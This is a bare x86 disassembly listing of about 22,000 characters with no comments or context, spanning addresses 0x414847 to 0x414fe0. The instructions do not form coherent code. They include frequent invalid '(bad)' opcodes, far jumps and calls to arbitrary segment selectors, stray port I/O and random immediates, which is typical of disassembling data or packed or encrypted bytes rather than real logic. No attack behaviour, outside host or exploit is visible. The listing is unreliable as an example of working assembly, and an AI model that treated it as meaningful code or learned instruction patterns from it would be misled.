  414847:	call   0x7eba:0xd35d01bf
  41484e:	retf   0xd288
  414851:	jp     0x414862
  414853:	mov    ds:0x3c0c6592,eax
  414858:	jmp    0x4147e7
  41485a:	add    ah,BYTE PTR [esi]
  41485c:	ret    0xf590
  41485f:	xor    ebp,DWORD PTR [eax]
  414861:	(bad)  
  414862:	cdq    
  414863:	shr    DWORD PTR ds:0x6851f957,0x59
  41486a:	and    DWORD PTR [edx+0x53],eax
  41486d:	push   0xa3c78ef4
  414872:	stos   BYTE PTR es:[edi],al
  414873:	aad    0x39
  414875:	sahf   
  414876:	dec    ecx
  414877:	pop    eax
  414878:	lods   eax,DWORD PTR ds:[esi]
  414879:	push   ds
  41487a:	rol    ch,cl
  41487c:	popf   
  41487d:	push   0xffffff94
  41487f:	test   DWORD PTR [edi],eax
  414881:	js     0x414872
  414883:	and    al,0x76
  414885:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414886:	es jbe 0x4148fc
  414889:	adc    DWORD PTR [eax-0x1ec83df5],ecx
  41488f:	inc    ecx
  414890:	lock cld 
  414892:	pusha  
  414893:	and    eax,0xb1c69ea4
  414898:	loope  0x4148e8
  41489a:	fcomp  QWORD PTR [ebp-0x34]
  41489d:	mov    al,ds:0x6c55f184
  4148a2:	xchg   DWORD PTR [ecx],ebp
  4148a4:	jnp    0x41486a
  4148a6:	push   edi
  4148a7:	dec    esp
  4148a8:	popa   
  4148a9:	shr    DWORD PTR [eax+0x35d8315a],1
  4148af:	mov    ch,0x61
  4148b1:	inc    edi
  4148b2:	xchg   ecx,eax
  4148b3:	outs   dx,BYTE PTR ds:[esi]
  4148b4:	adc    ebp,ecx
  4148b6:	ficomp WORD PTR [eax+0x4e672a97]
  4148bc:	dec    ebx
  4148bd:	mov    dl,bh
  4148bf:	les    ecx,FWORD PTR [edi-0x7b]
  4148c2:	call   0xcd43:0x1fe2f3d9
  4148c9:	cmp    ah,BYTE PTR [eax+0x62fca632]
  4148cf:	mov    esi,0x11964fe
  4148d4:	adc    al,0x6
  4148d6:	pop    esi
  4148d7:	in     eax,0xc1
  4148d9:	leave  
  4148da:	add    DWORD PTR [esi],edi
  4148dc:	stos   BYTE PTR es:[edi],al
  4148dd:	xor    BYTE PTR [ebp+ebp*8-0x7f8ec6bc],bl
  4148e4:	(bad)
  4148e7:	and    BYTE PTR [ecx+0x6],0xc7
  4148eb:	cmp    al,0x12
  4148ed:	mov    bl,al
  4148ef:	mov    ?,WORD PTR [ebx]
  4148f1:	xchg   edi,eax
  4148f2:	xchg   BYTE PTR [ecx+0x1f],ah
  4148f5:	pop    esi
  4148f6:	imul   ebx,DWORD PTR [eax-0xc],0xffffffa2
  4148fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148fb:	push   ecx
  4148fc:	pop    esi
  4148fd:	std    
  4148fe:	scas   eax,DWORD PTR es:[edi]
  4148ff:	xlat   BYTE PTR ds:[ebx]
  414900:	mov    cl,BYTE PTR [ebx]
  414902:	xlat   BYTE PTR ds:[ebx]
  414903:	push   esi
  414904:	fs cdq 
  414906:	and    DWORD PTR [edi+0x7c4ce1a7],edi
  41490c:	pop    ebx
  41490d:	out    0x50,eax
  41490f:	jg     0x4148be
  414911:	mov    edi,0x3d5b2749
  414916:	or     DWORD PTR [esi+0xa],eax
  414919:	and    eax,0x389b1380
  41491e:	mov    WORD PTR [edx+0x1e68a9e9],?
  414924:	das    
  414925:	push   esi
  414926:	mov    ds:0xa657c74,al
  41492b:	inc    edx
  41492c:	test   DWORD PTR [ebx+0x1c850c0e],esp
  414932:	jb     0x414935
  414934:	dec    esp
  414935:	mov    BYTE PTR [edi-0x14],dh
  414938:	daa    
  414939:	nop
  41493a:	xchg   edx,eax
  41493b:	ret    
  41493c:	dec    edi
  41493d:	pop    ds
  41493e:	xchg   ecx,eax
  41493f:	loope  0x414962
  414941:	xchg   edi,eax
  414942:	in     eax,dx
  414943:	mov    edi,DWORD PTR [edi+ecx*1-0x3d]
  414947:	and    DWORD PTR [ebx+esi*4-0x3a],edi
  41494b:	leave  
  41494c:	mov    al,ds:0xc53f9f37
  414951:	sub    eax,0x109a1d3a
  414956:	jl     0x414998
  414958:	out    dx,eax
  414959:	lock ficom DWORD PTR [edx-0x28]
  41495d:	stos   DWORD PTR es:[edi],eax
  41495e:	add    BYTE PTR [edx-0x77f37822],cl
  414964:	icebp  
  414965:	cmp    bl,cl
  414967:	mov    DWORD PTR ss:[edx-0x34da0a92],edi
  41496e:	ja     0x414931
  414970:	arpl   si,dx
  414972:	std    
  414973:	clc    
  414974:	mov    esi,0xdff5173
  414979:	adc    bl,ah
  41497b:	retf   
  41497c:	stos   DWORD PTR es:[edi],eax
  41497d:	cmp    al,0x34
  41497f:	scas   eax,DWORD PTR es:[edi]
  414980:	in     al,0xb9
  414982:	jae    0x4149ba
  414984:	fs pusha 
  414986:	ss cs push es
  414989:	rcl    BYTE PTR [edx],1
  41498b:	xlat   BYTE PTR ds:[ebx]
  41498c:	adc    al,0x1
  41498e:	jbe    0x414987
  414990:	jnp    0x4149aa
  414992:	jb     0x4149fe
  414994:	pop    ebx
  414995:	popf   
  414996:	push   esi
  414997:	add    DWORD PTR [ebx+ecx*2],eax
  41499a:	pop    ds
  41499b:	dec    ebp
  41499c:	pop    eax
  41499d:	or     esi,DWORD PTR [esi-0x6fcd6fbd]
  4149a3:	clc    
  4149a4:	call   DWORD PTR [ebx]
  4149a6:	add    eax,0x6e1a910d
  4149ab:	out    0xed,al
  4149ad:	cdq    
  4149ae:	xor    BYTE PTR [edx-0x80],ch
  4149b1:	pop    edi
  4149b2:	jl     0x414a20
  4149b4:	cmovl  eax,DWORD PTR [edx]
  4149b7:	jp     0x4149c8
  4149b9:	sbb    DWORD PTR [ebx],eax
  4149bb:	mov    cl,0x45
  4149bd:	in     al,dx
  4149be:	or     DWORD PTR [ebx-0x2c],ebp
  4149c1:	add    edx,DWORD PTR [ebp-0x15]
  4149c4:	sub    ebp,DWORD PTR [ecx+0x55e3b165]
  4149ca:	int    0x1d
  4149cc:	pusha  
  4149cd:	and    eax,edi
  4149cf:	fwait
  4149d0:	lahf   
  4149d1:	pusha  
  4149d2:	sahf   
  4149d3:	xchg   ebx,eax
  4149d4:	push   edx
  4149d5:	mov    bl,0xa6
  4149d7:	rol    DWORD PTR [edx+0x2a],1
  4149da:	mov    esi,0x833eb936
  4149df:	fmul   DWORD PTR [edi-0x6e]
  4149e2:	pop    edi
  4149e3:	scas   eax,DWORD PTR es:[edi]
  4149e4:	jl     0x41499b
  4149e6:	fstp   DWORD PTR [edi+0x5df14ca9]
  4149ec:	or     bl,BYTE PTR [edi]
  4149ee:	xchg   esi,eax
  4149ef:	sub    BYTE PTR [eax-0x610e098b],dh
  4149f5:	ret    
  4149f6:	dec    esi
  4149f7:	mov    esi,0xcde5450e
  4149fc:	mov    eax,ds:0xb040aea8
  414a01:	jmp    0x1e91:0xd5bc9240
  414a08:	(bad)  
  414a09:	mov    cl,0x26
  414a0b:	xchg   ebp,eax
  414a0c:	dec    ecx
  414a0d:	(bad)  
  414a0e:	sbb    dl,BYTE PTR [edi-0x746c9c01]
  414a14:	jae    0x414a12
  414a16:	add    ch,al
  414a18:	adc    eax,DWORD PTR ds:0x8ab7cc53
  414a1e:	xchg   esi,eax
  414a1f:	mov    esp,0x7ed9eea0
  414a24:	in     al,dx
  414a25:	cli    
  414a26:	jno    0x4149ac
  414a28:	fwait
  414a29:	mov    ebp,0xa48ea70b
  414a2e:	inc    ecx
  414a2f:	mov    DWORD PTR [ecx],edx
  414a31:	repnz mov cl,0xde
  414a34:	xor    eax,0xd840a64d
  414a39:	xlat   BYTE PTR ds:[ebx]
  414a3a:	cld    
  414a3b:	addr16 popa 
  414a3d:	dec    esp
  414a3e:	add    eax,0x78d7463
  414a43:	xor    BYTE PTR [ebp+ebx*2-0x31],dh
  414a47:	iret   
  414a48:	(bad)  
  414a49:	ficom  WORD PTR [ebp+edi*1+0x75]
  414a4d:	(bad)  
  414a4e:	cmp    ch,BYTE PTR [eax+0x75]
  414a51:	(bad)  
  414a52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a53:	and    al,0xdc
  414a55:	push   ss
  414a56:	stos   DWORD PTR es:[edi],eax
  414a57:	enter  0xa17e,0xda
  414a5b:	mov    dl,ch
  414a5d:	out    dx,al
  414a5e:	xchg   BYTE PTR [esi-0x4a548b8c],bh
  414a64:	test   edx,eax
  414a66:	mov    esi,0x77cc7343
  414a6b:	sar    eax,1
  414a6d:	jmp    0x8022:0xf48dc1fb
  414a74:	cmp    eax,DWORD PTR [edi-0x24]
  414a77:	popa   
  414a78:	jns    0x414a65
  414a7a:	sbb    DWORD PTR ds:0xa5ad5bce,0x84760d4a
  414a84:	jp     0x414a92
  414a86:	sub    BYTE PTR [ecx-0x1b],cl
  414a89:	jge    0x414aac
  414a8b:	lahf   
  414a8c:	test   esi,ebx
  414a8e:	stc    
  414a8f:	sub    BYTE PTR [ebx-0xdba327b],ah
  414a95:	das    
  414a96:	fst    DWORD PTR [edx-0x3755df29]
  414a9c:	sub    al,0xc
  414a9e:	push   es
  414a9f:	stc    
  414aa0:	pop    eax
  414aa1:	in     al,0xcf
  414aa3:	ror    BYTE PTR [ebp+0x72672e09],1
  414aa9:	pusha  
  414aaa:	(bad)  
  414aab:	adc    bl,al
  414aad:	sub    cl,cl
  414aaf:	sahf   
  414ab0:	dec    ebp
  414ab1:	jp     0x414a53
  414ab3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ab4:	inc    esi
  414ab5:	(bad)  
  414ab6:	jae    0x414a90
  414ab8:	mov    al,0x89
  414aba:	shl    dl,1
  414abc:	js     0x414a5c
  414abe:	xor    DWORD PTR [eax+0x7c],edi
  414ac1:	aaa    
  414ac2:	aaa    
  414ac3:	aad    0xf0
  414ac5:	ret    0xcd7b
  414ac8:	xchg   edx,eax
  414ac9:	and    edi,DWORD PTR [ecx]
  414acb:	dec    eax
  414acc:	daa    
  414acd:	pushf  
  414ace:	cmp    eax,0xff03262c
  414ad3:	lods   eax,DWORD PTR ds:[esi]
  414ad4:	sar    dh,1
  414ad6:	add    BYTE PTR [esi],ch
  414ad8:	mov    ch,0x6c
  414ada:	arpl   cx,bx
  414adc:	mov    dh,0x43
  414ade:	(bad)  
  414ae0:	fiadd  DWORD PTR [esp+ecx*4-0x7e]
  414ae4:	or     bl,BYTE PTR [ecx]
  414ae6:	shl    DWORD PTR [ebp+0x7656065d],0xb3
  414aed:	mov    dh,BYTE PTR [ecx]
  414aef:	adc    ah,ch
  414af1:	pushf  
  414af2:	add    eax,0x23463a00
  414af7:	or     DWORD PTR [eax],eax
  414af9:	push   ds
  414afa:	ja     0x414b6d
  414afc:	rcr    esp,0xa9
  414aff:	sbb    al,0xfd
  414b01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b02:	(bad)  
  414b03:	jl     0x414abb
  414b05:	or     edx,DWORD PTR [edx+ebx*2]
  414b08:	loope  0x414abd
  414b0a:	sbb    eax,0xe1620054
  414b0f:	push   eax
  414b10:	cld    
  414b11:	jno    0x414b4a
  414b13:	mov    esi,0x437352d
  414b18:	jmp    0x414b67
  414b1a:	cmp    al,BYTE PTR [eax]
  414b1c:	in     eax,0x2
  414b1e:	jnp    0x414ac8
  414b20:	jl     0x414b8c
  414b22:	cdq    
  414b23:	and    al,0xfe
  414b25:	jae    0x414b80
  414b27:	pusha  
  414b28:	pop    ebp
  414b29:	mov    eax,ds:0xc027b01c
  414b2e:	jmp    0x18376dbf
  414b33:	jg     0x414afb
  414b35:	push   edi
  414b36:	sub    BYTE PTR [ebx-0x371b40c2],dl
  414b3c:	out    dx,eax
  414b3d:	hlt    
  414b3e:	int    0x46
  414b40:	and    cl,BYTE PTR [edx-0x10]
  414b43:	mov    dh,dl
  414b45:	mov    ecx,0x2ce32406
  414b4a:	jbe    0x414b1e
  414b4c:	cmp    dl,cl
  414b4e:	mov    ch,0x72
  414b50:	cs mov bh,0x82
  414b53:	pop    ds
  414b54:	dec    ebx
  414b55:	jmp    0x414bd4
  414b57:	inc    BYTE PTR [ecx-0x55]
  414b5a:	mov    ds:0xd15b3d85,al
  414b5f:	mov    fs,edx
  414b61:	adc    al,0x9b
  414b63:	fcmovu st,st(2)
  414b65:	out    dx,eax
  414b66:	ja     0x414bbc
  414b68:	adc    BYTE PTR ds:0x2ca9,cl
  414b6d:	iret   
  414b6e:	add    al,0x3d
  414b70:	lea    edi,[eax-0x5deef4bb]
  414b76:	bnd jo 0x414bee
  414b79:	popf   
  414b7a:	dec    eax
  414b7b:	ins    BYTE PTR es:[edi],dx
  414b7c:	test   BYTE PTR ds:0xbeadc4ee,al
  414b82:	neg    cl
  414b84:	push   ebp
  414b85:	(bad)  
  414b86:	fs push ds
  414b88:	imul   ecx,DWORD PTR [ebp+0x1b],0x924ce813
  414b8f:	addr16 test bh,al
  414b92:	imul   ebp,DWORD PTR [edx+0x53],0xf594c069
  414b99:	aad    0x41
  414b9b:	pop    esp
  414b9c:	xchg   DWORD PTR [ebx-0x6e78d42a],ebx
  414ba2:	push   eax
  414ba3:	unpckhps xmm0,XMMWORD PTR [ebx+0x7fd15251]
  414baa:	arpl   WORD PTR ds:0xc99539e8,bx
  414bb0:	in     eax,0xda
  414bb2:	mov    bh,0x1d
  414bb4:	sub    eax,0x2c80e379
  414bb9:	adc    al,0xce
  414bbb:	add    al,BYTE PTR [edx-0x3a]
  414bbe:	cdq    
  414bbf:	inc    esp
  414bc0:	or     ebx,DWORD PTR [edi]
  414bc2:	gs dec esp
  414bc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bc5:	sub    al,0x2b
  414bc7:	cs push esp
  414bc9:	inc    edx
  414bca:	ficomp WORD PTR [eax+0x3f]
  414bcd:	(bad)  
  414bcf:	add    DWORD PTR [ecx+0x4e3173b1],esp
  414bd5:	ret    0x5c2d
  414bd8:	add    al,0x21
  414bda:	aaa    
  414bdb:	xor    ah,al
  414bdd:	dec    esp
  414bde:	es xor al,0xef
  414be1:	(bad)  
  414be2:	mov    dh,0x38
  414be4:	add    DWORD PTR [edi-0x76d954dd],esi
  414bea:	sar    DWORD PTR [eax],cl
  414bec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bed:	jnp    0x414b9a
  414bef:	stos   BYTE PTR es:[edi],al
  414bf0:	pop    ss
  414bf1:	pop    ebp
  414bf2:	clc    
  414bf3:	cdq    
  414bf4:	fbstp  TBYTE PTR [eax+0x340aa429]
  414bfa:	nop
  414bfb:	lds    esp,FWORD PTR [ebx-0x3993262e]
  414c01:	shr    BYTE PTR [ebp-0x3a8f0d62],1
  414c07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c08:	mov    bh,BYTE PTR [ebx]
  414c0a:	adc    eax,DWORD PTR [esi-0x149c2592]
  414c10:	call   0x23642667
  414c15:	cmp    BYTE PTR [edx],ah
  414c17:	xor    DWORD PTR [ebx-0x33],edi
  414c1a:	daa    
  414c1b:	mov    edi,0x82d5099c
  414c20:	js     0x414c14
  414c22:	and    DWORD PTR [edx-0x77],edi
  414c25:	imul   BYTE PTR [edi-0x3650d9eb]
  414c2b:	imul   esi,edi,0xffffff87
  414c2e:	sub    BYTE PTR [eax],bh
  414c30:	rcr    eax,0xa4
  414c33:	fsubr  DWORD PTR [eax-0x11f76010]
  414c39:	scas   eax,DWORD PTR es:[edi]
  414c3a:	outs   dx,DWORD PTR ds:[esi]
  414c3b:	push   esi
  414c3c:	jns    0x414be6
  414c3e:	and    al,0x3
  414c40:	mov    al,0xad
  414c42:	repnz xlat BYTE PTR ds:[ebx]
  414c44:	mov    DWORD PTR [edx],ecx
  414c46:	addr16 pop esi
  414c48:	call   0xf65304f7
  414c4d:	mov    ch,0xc8
  414c4f:	jp     0x414c2c
  414c51:	es test al,0xcc
  414c54:	sbb    BYTE PTR [eax-0x44011ac7],0x10
  414c5b:	(bad)  
  414c5c:	in     eax,0x38
  414c5e:	out    dx,al
  414c5f:	lock push esi
  414c61:	sub    DWORD PTR [esi+0x52],ecx
  414c64:	fisub  DWORD PTR [edx]
  414c66:	xchg   edi,eax
  414c67:	push   esi
  414c68:	lahf   
  414c69:	mov    ch,0xda
  414c6b:	sahf   
  414c6c:	pop    edx
  414c6d:	(bad)  
  414c6e:	fst    DWORD PTR [ebp+ecx*4-0x4e]
  414c72:	scas   al,BYTE PTR es:[edi]
  414c73:	lock (bad) 
  414c75:	(bad)  
  414c76:	fsubr  DWORD PTR [esp+eiz*4-0x18094126]
  414c7d:	add    dl,ah
  414c7f:	cs add al,0x31
  414c82:	es ret 0x1aec
  414c86:	jl     0x414cbe
  414c88:	xchg   BYTE PTR [esi-0x44],ah
  414c8b:	push   gs
  414c8d:	or     al,0x77
  414c8f:	jl     0x414cdc
  414c91:	xchg   ebp,eax
  414c92:	pop    esi
  414c93:	scas   al,BYTE PTR es:[edi]
  414c94:	arpl   WORD PTR [edx-0x46],bx
  414c97:	aas    
  414c98:	inc    ebx
  414c99:	inc    eax
  414c9a:	mov    edi,0x45b79cd4
  414c9f:	jo     0x414cf0
  414ca1:	pop    esi
  414ca2:	push   0x17
  414ca4:	fcom   QWORD PTR gs:[eax-0x36]
  414ca8:	pusha  
  414ca9:	xchg   BYTE PTR [esi-0x77],dh
  414cac:	pop    eax
  414cad:	dec    ebp
  414cae:	jbe    0x414cf7
  414cb0:	scas   al,BYTE PTR es:[edi]
  414cb1:	test   DWORD PTR [edx+0x60],0x15bc33de
  414cb8:	mov    ebx,0xf0b8f178
  414cbd:	and    al,0x17
  414cbf:	pop    ds
  414cc0:	mov    DWORD PTR [ebp+0x409f1e12],ebp
  414cc6:	fwait
  414cc7:	das    
  414cc8:	mov    al,BYTE PTR [edi+0x1c]
  414ccb:	(bad)  
  414ccc:	jae    0x414d2f
  414cce:	mov    cl,0x97
  414cd0:	pop    ds
  414cd1:	rol    BYTE PTR [ecx-0x9443826],cl
  414cd7:	fs call 0xf203:0x15cdac07
  414cdf:	xchg   edx,eax
  414ce0:	xchg   ecx,eax
  414ce1:	(bad)  
  414ce2:	pop    dx
  414ce4:	cld    
  414ce5:	test   al,0xa0
  414ce7:	xor    al,0xd3
  414ce9:	ss push esp
  414ceb:	push   ds
  414cec:	pop    eax
  414ced:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cee:	adc    DWORD PTR [esi+0x1124cd84],eax
  414cf4:	retf   
  414cf5:	push   eax
  414cf6:	sbb    eax,0xd05d2e58
  414cfb:	jbe    0x414cbd
  414cfd:	dec    edi
  414cfe:	mov    eax,ds:0x2983379d
  414d03:	div    DWORD PTR [esi+0x13]
  414d06:	stos   DWORD PTR es:[edi],eax
  414d07:	adc    edi,DWORD PTR [ebx+0x31]
  414d0a:	es jns 0x414cca
  414d0d:	aaa    
  414d0e:	not    BYTE PTR [ebx-0x261675f7]
  414d14:	pop    eax
  414d15:	and    BYTE PTR [ebx],cl
  414d17:	je     0x414cfd
  414d19:	inc    esp
  414d1a:	ins    BYTE PTR es:[edi],dx
  414d1b:	mov    edx,0x28a71806
  414d20:	retf   0xca06
  414d23:	std    
  414d24:	adc    ebp,DWORD PTR [ecx+0x2b]
  414d27:	int    0xc0
  414d29:	rol    BYTE PTR [esi-0x2],cl
  414d2c:	cli    
  414d2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d2e:	hlt    
  414d2f:	jb     0x414d6a
  414d31:	jb     0x414cd8
  414d33:	outs   dx,DWORD PTR ds:[esi]
  414d34:	fcmovbe st,st(1)
  414d36:	pop    ecx
  414d37:	lods   al,BYTE PTR ds:[esi]
  414d38:	pop    ss
  414d39:	aaa    
  414d3a:	xor    ah,BYTE PTR [ebx]
  414d3c:	mov    DWORD PTR [ebx+0x0],ecx
  414d3f:	fsubr  QWORD PTR [esi-0x598b09e7]
  414d45:	enter  0xa16e,0x2b
  414d49:	cmp    eax,0x3d68e11e
  414d4e:	out    dx,al
  414d4f:	add    eax,0xa8538a94
  414d54:	dec    eax
  414d55:	(bad)  
  414d56:	adc    DWORD PTR [eax+edx*2+0x14],edx
  414d5a:	adc    al,BYTE PTR [eax+0x73]
  414d5d:	aam    0x46
  414d5f:	add    DWORD PTR [edi-0x4d],esi
  414d62:	cwde   
  414d63:	addr16 or bh,dh
  414d66:	test   eax,0x5598337f
  414d6b:	fcomp  QWORD PTR [esi]
  414d6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d6e:	loope  0x414d65
  414d70:	mov    ebx,ecx
  414d72:	fiadd  DWORD PTR [ebx]
  414d74:	retf   
  414d75:	aam    0xe5
  414d77:	ret    0x52f7
  414d7a:	mov    dh,0x4d
  414d7c:	inc    edi
  414d7d:	pop    esi
  414d7e:	cmp    al,0x1b
  414d80:	ins    DWORD PTR es:[edi],dx
  414d81:	jle    0x414d1a
  414d83:	(bad)  
  414d84:	and    eax,0xef11a620
  414d89:	pop    ds
  414d8a:	aad    0x5b
  414d8c:	xchg   ecx,eax
  414d8d:	jp     0x414d42
  414d8f:	inc    edx
  414d90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d91:	cmp    bl,dl
  414d93:	aam    0x8e
  414d95:	pop    edi
  414d96:	sti    
  414d97:	adc    BYTE PTR [eax+edi*8+0x94df285],bh
  414d9e:	dec    edi
  414d9f:	out    dx,al
  414da0:	add    bh,BYTE PTR [eax-0x52]
  414da3:	xor    al,0xe5
  414da5:	retf   0xcc32
  414da8:	pop    esi
  414da9:	inc    ecx
  414daa:	pushf  
  414dab:	int3   
  414dac:	mov    dl,0x90
  414dae:	push   ecx
  414daf:	sub    eax,0xd0a04b3a
  414db4:	mov    edi,0x28fd03eb
  414db9:	sbb    al,0xb3
  414dbb:	pop    ebp
  414dbc:	addr16 and al,0xcb
  414dbf:	push   ds
  414dc0:	cmp    cl,BYTE PTR [ecx]
  414dc2:	gs aad 0x10
  414dc5:	adc    BYTE PTR fs:[ecx-0x134650e2],bh
  414dcc:	mov    ds:0x8ed05a96,eax
  414dd1:	jb     0x414d8f
  414dd3:	jmp    0x7e2d009b
  414dd8:	and    al,0x7f
  414dda:	out    dx,eax
  414ddb:	dec    ecx
  414ddc:	pop    edi
  414ddd:	(bad)  
  414dde:	jns    0x414d63
  414de0:	std    
  414de1:	fcomi  st,st(7)
  414de3:	xor    ebx,edi
  414de5:	repz cmc 
  414de7:	repnz mov ebx,0xb95aa2a0
  414ded:	inc    ebx
  414dee:	jmp    0xf4af:0xa557c7b7
  414df5:	int3   
  414df6:	(bad)  
  414df7:	xor    ah,BYTE PTR [ebx+0x12]
  414dfa:	adc    eax,edx
  414dfc:	dec    eax
  414dfd:	xchg   ebx,eax
  414dfe:	adc    bl,BYTE PTR [eax+0x580eec19]
  414e04:	jnp    0x414e04
  414e06:	push   ecx
  414e07:	repz add DWORD PTR [ebp+eiz*4-0x572c5bd6],ecx
  414e0f:	(bad)  
  414e10:	sti    
  414e11:	cmp    al,BYTE PTR [ebx]
  414e13:	nop
  414e14:	mov    ds:0x5a244f0b,al
  414e19:	outs   dx,BYTE PTR ds:[esi]
  414e1a:	inc    edx
  414e1b:	repz bound edi,QWORD PTR gs:[ebx]
  414e1f:	jmp    0x33ca:0xacf17519
  414e26:	adc    al,0xe9
  414e28:	jb     0x414dfd
  414e2a:	cli    
  414e2b:	xlat   BYTE PTR ds:[ebx]
  414e2c:	mov    ecx,0xa3dbe253
  414e31:	int    0x6c
  414e33:	ret    
  414e34:	leave  
  414e35:	sub    BYTE PTR [ecx],ch
  414e37:	loopne 0x414dcb
  414e39:	mov    ds:0x312ef55a,eax
  414e3e:	sub    eax,0x2684b511
  414e43:	xor    DWORD PTR [ebx+0x7fa425c1],esp
  414e49:	jno    0x414e25
  414e4b:	mov    bh,0x1
  414e4d:	into   
  414e4e:	inc    esp
  414e4f:	push   ss
  414e50:	into   
  414e51:	mov    ebp,0xc409f9b8
  414e56:	jno    0x414ed2
  414e58:	push   esi
  414e59:	lods   al,BYTE PTR ds:[esi]
  414e5a:	test   esi,0xb04a6ca0
  414e60:	(bad)  
  414e61:	out    dx,al
  414e62:	cs loope 0x414ebc
  414e65:	rcr    DWORD PTR [edi*8+0x3ec62ea6],0xf7
  414e6d:	fidiv  DWORD PTR [edi-0x527d1c47]
  414e73:	es push eax
  414e75:	ds scas eax,DWORD PTR es:[edi]
  414e77:	inc    ebp
  414e78:	fcmovnu st,st(2)
  414e7a:	mov    eax,0x6ea8cb8f
  414e7f:	push   esi
  414e80:	jae    0x414e62
  414e82:	mov    BYTE PTR [ecx],bl
  414e84:	icebp  
  414e85:	cmp    BYTE PTR [edi],dh
  414e87:	aam    0x62
  414e89:	add    BYTE PTR [ebx+eiz*2+0x6b],ah
  414e8d:	out    0x76,eax
  414e8f:	jmp    0xb02e:0xf1068854
  414e96:	loop   0x414ea7
  414e98:	popf   
  414e99:	cmp    eax,0xbd83ada5
  414e9e:	mov    dh,0x9a
  414ea0:	xchg   ecx,eax
  414ea1:	(bad)  
  414ea3:	int    0xaa
  414ea5:	mov    esp,0x96e980f1
  414eaa:	sti    
  414eab:	push   ebx
  414eac:	jl     0x414f1d
  414eae:	adc    BYTE PTR [ebx],ah
  414eb0:	xor    eax,0xeb8def0b
  414eb5:	or     eax,0xf30db23b
  414eba:	je     0x414ee3
  414ebc:	imul   edx,ebp,0xffffff94
  414ebf:	das    
  414ec0:	mov    ds:0xae7c48d,al
  414ec5:	aad    0xcf
  414ec7:	or     eax,DWORD PTR [esi+0x76b9a5eb]
  414ecd:	cmp    ecx,ebx
  414ecf:	add    eax,0x670ff252
  414ed4:	adc    ebx,DWORD PTR [esi]
  414ed6:	adc    ch,BYTE PTR [ecx+0x5ac43018]
  414edc:	pop    esp
  414edd:	jmp    0x414e71
  414edf:	fimul  DWORD PTR [ecx-0x38]
  414ee2:	jle    0x414e9f
  414ee4:	pop    edi
  414ee5:	jp     0x414f5c
  414ee7:	sbb    DWORD PTR [eax],esp
  414ee9:	xor    edx,DWORD PTR [ebx+edi*2+0xc2f6228]
  414ef0:	push   ds
  414ef1:	aas    
  414ef2:	pop    ebp
  414ef3:	pusha  
  414ef4:	push   cs
  414ef5:	xchg   ebx,eax
  414ef6:	pop    ebx
  414ef7:	fisub  DWORD PTR [edx]
  414ef9:	aaa    
  414efa:	loope  0x414e84
  414efc:	jmp    0x414ec1
  414efe:	aad    0x6a
  414f00:	je     0x414f3f
  414f02:	add    ch,BYTE PTR ds:[edx-0x43]
  414f06:	mov    WORD PTR ds:0x622eba32,cs
  414f0c:	xor    al,0x4e
  414f0e:	pop    ds
  414f0f:	xor    DWORD PTR [ebx],ebp
  414f11:	sbb    eax,0x8a63afd1
  414f16:	jmp    0xddc9:0xbd3ec950
  414f1d:	or     al,0x2b
  414f1f:	jns    0x414f64
  414f21:	cmp    al,0x6b
  414f23:	mov    DWORD PTR [ebx-0x6e3815fc],eax
  414f29:	and    edx,esp
  414f2b:	mov    ds:0xe717bcce,al
  414f30:	in     eax,0xb6
  414f32:	cwde   
  414f33:	ja     0x414ee1
  414f35:	into   
  414f36:	repz jne 0x414eed
  414f39:	ss dec esi
  414f3b:	test   al,0x25
  414f3d:	loopne 0x414f57
  414f3f:	pop    ebx
  414f40:	push   ss
  414f41:	cld    
  414f42:	jnp    0x414f4d
  414f44:	out    0x75,al
  414f46:	daa    
  414f47:	aaa    
  414f48:	xchg   ecx,eax
  414f49:	lahf   
  414f4a:	sub    DWORD PTR [esi-0x76214c65],edx
  414f50:	or     DWORD PTR [eax],ebx
  414f52:	xchg   edx,eax
  414f53:	mov    DWORD PTR [esi],eax
  414f55:	mov    al,ds:0x44a40711
  414f5a:	or     DWORD PTR ds:0xbd0df100,ecx
  414f60:	popf   
  414f61:	aad    0xb0
  414f63:	or     esp,ebx
  414f65:	imul   ecx,DWORD PTR [esi+edi*2-0x27b7f037],0x7143e5fd
  414f70:	jp     0x414f9e
  414f72:	ror    DWORD PTR [edi],1
  414f74:	in     eax,0x17
  414f76:	fidiv  DWORD PTR [esi]
  414f78:	aad    0xa8
  414f7a:	xor    al,0x5
  414f7c:	loop   0x414ffb
  414f7e:	lods   eax,DWORD PTR es:[esi]
  414f80:	dec    ecx
  414f81:	add    esi,DWORD PTR [edi-0xc3104b7]
  414f87:	sbb    eax,0xe79364ff
  414f8c:	cwde   
  414f8d:	mov    esp,0xbe2bbf5b
  414f92:	jmp    0x5c1f:0x71138b5c
  414f99:	jmp    0x414f2b
  414f9b:	dec    edi
  414f9c:	or     BYTE PTR [eax+0x53],bh
  414f9f:	outs   dx,BYTE PTR fs:[esi]
  414fa1:	jae    0x414f51
  414fa3:	mov    bh,0x83
  414fa5:	call   0x12e097eb
  414faa:	(bad)  
  414fab:	add    eax,0x96d84471
  414fb0:	dec    ebx
  414fb1:	sub    eax,edi
  414fb3:	push   es
  414fb4:	cmp    ah,BYTE PTR [ebx-0x4f]
  414fb7:	cmp    ah,bh
  414fb9:	cwde   
  414fba:	xor    BYTE PTR [ecx+ecx*8+0x22c2b9e4],dh
  414fc1:	or     al,0x84
  414fc3:	pop    eax
  414fc4:	inc    esp
  414fc5:	inc    BYTE PTR [edx+0x6a947825]
  414fcb:	pop    ss
  414fcc:	test   BYTE PTR [edx],ch
  414fce:	ret    
  414fcf:	and    BYTE PTR [ebp-0x4f],0x8c
  414fd3:	mov    bh,0x6
  414fd5:	lds    eax,FWORD PTR [esi-0xf422ab1]
  414fdb:	ss dec edx
  414fdd:	xor    DWORD PTR [ebp-0x45],ebp
  414fe0:	dec    BYTE PTR [esi+0x54d30d36]
